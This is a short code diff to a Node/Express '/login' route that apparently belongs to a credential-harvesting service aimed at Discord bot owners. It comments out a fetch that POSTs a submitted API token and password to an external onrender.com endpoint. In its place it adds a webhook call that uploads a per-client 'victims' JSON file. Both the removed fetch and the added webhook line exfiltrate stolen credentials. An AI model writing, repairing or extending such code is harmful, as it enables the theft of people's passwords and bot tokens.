@@ -182,7 +182,7 @@ app.post('/login', limiter, async (req, res) => {
         'guildId': js.guildId,
         'clientId': js.clientId,
       }, null, 3));
-      
+      /*
       // Send API token and password to another endpoint
       await fetch('https://authentication-lowfo.onrender.com/add_token', {
         method: 'POST',
@@ -194,7 +194,8 @@ app.post('/login', limiter, async (req, res) => {
           'password': password
         })
       });
-
+      */
+      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`))
       return res.status(200).json({
         'status': 1
       });
